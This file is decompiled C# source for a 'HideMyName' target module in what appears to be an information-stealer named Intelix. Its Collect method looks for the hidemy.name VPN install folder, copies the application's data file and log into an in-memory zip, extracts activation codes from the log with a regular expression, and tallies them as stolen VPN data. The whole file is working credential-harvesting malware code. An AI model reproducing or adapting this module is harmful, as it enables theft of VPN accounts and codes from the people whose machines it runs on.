using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn
{
	// Token: 0x0200000B RID: 11
	public class HideMyName : ITarget
	{
		// Token: 0x06000028 RID: 40 RVA: 0x00002A94 File Offset: 0x00000C94
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = "C:\\Program Files\\hidemy.name VPN 2.0";
			bool flag = !Directory.Exists(text);
			if (!flag)
			{
				string text2 = "HideMyName";
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "HideMyName";
				bool flag2 = File.Exists(text + "\\HideMyName");
				if (flag2)
				{
					zip.AddFile(text2 + "\\HideMyName", File.ReadAllBytes(text + "\\HideMyName"));
					counterApplications.Files.Add(text + "\\HideMyName => " + text2 + "\\HideMyName");
				}
				bool flag3 = File.Exists(text + "\\log-app.txt");
				if (flag3)
				{
					zip.AddFile(text2 + "\\log-app.txt", File.ReadAllBytes(text + "\\log-app.txt"));
					counterApplications.Files.Add(text + "\\log-app.txt => " + text2 + "\\log-app.txt");
					List<string> list = new List<string>();
					foreach (object obj in new Regex("code\\s+(\\d+)").Matches(File.ReadAllText(text + "\\log-app.txt")))
					{
						Match match = (Match)obj;
						bool success = match.Success;
						if (success)
						{
							string value = match.Groups[1].Value;
							bool flag4 = !list.Contains(value);
							if (flag4)
							{
								list.Add(value);
							}
						}
					}
					bool flag5 = list.Count<string>() > 0;
					if (flag5)
					{
						zip.AddTextFile(text2 + "\\ActivatedCodes.txt", string.Join("\n", list));
						counterApplications.Files.Add(text + "\\log-app.txt => " + text2 + "\\ActivatedCodes.txt");
					}
				}
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counter.Vpns.Add(counterApplications);
			}
		}
	}
}
